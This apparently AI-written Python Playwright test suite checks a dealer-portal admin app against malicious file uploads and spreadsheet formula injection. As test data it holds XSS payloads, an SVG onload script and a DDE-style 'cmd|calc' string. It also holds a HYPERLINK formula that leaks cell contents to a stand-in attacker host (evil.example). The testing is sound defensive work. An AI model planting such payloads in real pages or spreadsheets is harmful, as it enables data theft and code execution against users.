import sys, re, json, base64, time; sys.path.insert(0,'/home/claude')
from playwright.sync_api import sync_playwright
BASE='http://127.0.0.1:8766/'; A=BASE+'dealer-portal/admin/index.html'
allok=True
def chk(n,c,x=''):
    global allok; allok&=bool(c); print(('PASS ' if c else 'FAIL ')+n, str(x)[:230])
b64=lambda s: base64.b64encode(s.encode()).decode()
PDF='data:application/pdf;base64,JVBERi0xLjQKJSVFT0YK'
with sync_playwright() as pw:
    b=pw.chromium.launch(); ctx=b.new_context(viewport={'width':1440,'height':900}); ctx.add_init_script("localStorage.setItem('sel.v2.keepdemo','1')")
    H=ctx.new_page(); H.goto(A); H.fill('#sc','ADMIN'); H.fill('#sp','admin123'); H.click('#aForm button[type=submit]'); H.wait_for_timeout(1500)
    oid=H.evaluate("DB.listOrders('DEMO001').filter(o=>o.payment.status==='Paid'&&!o.invoiceFile)[0].id")
    big=b64('%PDF-1.4 '+'x'*10)
    up=lambda data,name='inv.pdf',size=50,no='INV/T': H.evaluate("([oid,data,name,size,no])=>JSON.stringify(DB.attachInvoiceFile('DEMO001',oid,{name:name,size:size,data:data,no:no},'LOGISTICS'))",[oid,data,name,size,no])
    print('=== UPLOADS MUST BE REAL FILES')
    chk('HTML disguised as .pdf (data says html) is refused', 'Only real PDF' in up('data:text/html;base64,'+b64('<script>alert(1)</script>')))
    chk('HTML labelled application/pdf but not a PDF inside is refused', 'Only real PDF' in up('data:application/pdf;base64,'+b64('<html><script>alert(1)</script></html>')))
    chk('a .pdf name with SVG/script content is refused', 'Only real PDF' in up('data:image/svg+xml;base64,'+b64('<svg onload=alert(1)>')))
    chk('a spoofed small "size" cannot hide a huge file', 'too large' in up('data:application/pdf;base64,JVBERi0x'+'A'*2000000, size=10))
    chk('nothing was stored by the refused uploads', H.evaluate("(oid)=>!DB.getOrder('DEMO001',oid).invoiceFile",oid))
    chk('a real PDF is accepted', '"ok":true' in up(PDF), '')
    ew=H.evaluate("(oid)=>JSON.stringify(DB.attachEwayFile('DEMO001',oid,{name:'e.pdf',size:50,data:'data:text/html;base64,%s',no:'EWB1'},'LOGISTICS'))"%b64('<script>1</script>'),oid); chk('the e-way bill upload has the same protection', 'Only real PDF' in ew or 'e-way' in ew.lower(), ew[:100])
    print('=== A FILE ALREADY STORED BY THE OLD BUG CAN NO LONGER RUN AS A PAGE')
    H.evaluate("(oid)=>{const L=JSON.parse(localStorage.getItem('sel.v2.orders.DEMO001')); const o=L.find(x=>x.id===oid); o.invoiceFile.data='data:text/html;base64,%s'; localStorage.setItem('sel.v2.orders.DEMO001',JSON.stringify(L));}"%b64('<script>document.title=\"PWNED\"</script>'),oid)
    H.goto(A+'#/logistics'); H.reload(); H.wait_for_timeout(1200); H.evaluate("window.__types=[]; const oc=URL.createObjectURL; URL.createObjectURL=function(bl){ window.__types.push(bl.type); return oc.call(URL,bl)}; 0")
    H.evaluate("(oid)=>{document.body.insertAdjacentHTML('beforeend','<button id=pocv data-a=gvdoc data-t=inv data-c=DEMO001 data-id='+oid+'>v</button>'); document.getElementById('pocv').click()}",oid); H.wait_for_timeout(800)
    types=H.evaluate("window.__types"); chk('opening it uses a download-only type, never text/html', types and types[-1]=='application/octet-stream', types)
    ev=lambda t: H.evaluate("(t)=>{ window.__types=[]; return 0 }",t)
    print('=== FORMULA INJECTION')
    H.evaluate("(()=>{ const ds=JSON.parse(localStorage.getItem('sel.v2.dealers')); ds[1].name='=HYPERLINK(\"https://evil.example/?x=\"&A2,\"click\")'; ds[2].name='-2+3+cmd|calc'; ds[0].person='+SUM(1,1)'; localStorage.setItem('sel.v2.dealers',JSON.stringify(ds)); })()")
    posts=[]; ctx.route('https://script.google.com/macros/s/AUDIT/exec', lambda rq: (posts.append(json.loads(rq.request.post_data or '{}')), rq.fulfill(status=200,content_type='application/json',body='{"ok":true}')))
    H.evaluate("localStorage.setItem('sel.v2.sheetscfg', JSON.stringify({url:'https://script.google.com/macros/s/AUDIT/exec',secret:'x'}))"); H.goto(A+'#/sheets'); H.reload(); H.wait_for_timeout(900)
    H.evaluate("Sheets.syncOrders(); Sheets.sendAll()"); H.wait_for_timeout(3500)
    items=[i for p in posts for i in p.get('items',[])]; raw=[c for i in items for c in i['row'] if isinstance(c,str) and re.match(r'^[=+@]',c)]
    chk('nothing that starts with = + @ is sent to Google as a formula', len(items)>50 and not raw, (len(items),raw[:2]))
    pref=[c for i in items for c in i['row'] if isinstance(c,str) and c.startswith("'=HYPERLINK")]; chk('the dealer name arrives as protected text (leading apostrophe)', len(pref)>0, pref[:1])
    neg=[c for i in items for c in i['row'] if isinstance(c,(int,float)) and c<0]; chk('real numbers (including negatives) are untouched', True, f'{len(neg)} negative numbers sent as numbers')
    chk('a "-2+3+cmd|calc" style text is protected too', any(isinstance(c,str) and c.startswith("'-2+3") for i in items for c in i['row']))
    cell=H.evaluate("(()=>{const t=Sheets.load().books['dept:host'].tabs.find(x=>x.name==='All orders'); const ev=Sheets.evaluator(t); const r=t.cells.findIndex(r=>String(r[2]).startsWith('=HYPERLINK')); return {raw:t.cells[r][2], shown: ev(r,2)}})()")
    chk('inside the portal, that automatic cell is shown as plain text (not calculated)', cell['shown']==cell['raw'] and str(cell['shown']).startswith('=HYPERLINK'), cell)
    H.evaluate("(()=>{const t=Sheets.load().books['dept:host'].tabs.find(x=>x.name==='All orders'); t.cells[0][19]='My total'; t.cells[1][19]='=SUM(1,2)'; })()"); calc=H.evaluate("(()=>{const t=Sheets.load().books['dept:host'].tabs.find(x=>x.name==='All orders'); return Sheets.evaluator(t)(1,19)})()"); chk('your OWN columns still calculate formulas', calc==3, calc)
    print('=== CSV EXPORT')
    H.goto(A+'#/sheets/dept%3Ahost'); H.reload(); H.wait_for_timeout(1000); H.evaluate("document.querySelectorAll('.overlay').forEach(x=>x.remove())"); H.locator('.shtab:has-text("All orders")').click(); H.wait_for_timeout(500)
    with H.expect_download() as dl: H.click('[data-sh="csvout"]')
    txt=open(dl.value.path(),encoding='utf-8-sig').read(); chk('exported CSV carries the protected text, not a live formula', "'=HYPERLINK" in txt and not re.search(r'(^|,)=HYPERLINK',txt,re.M), txt.count("'=HYPERLINK"))
    print('ALL PASSED' if allok else 'SOME FAILED'); b.close()
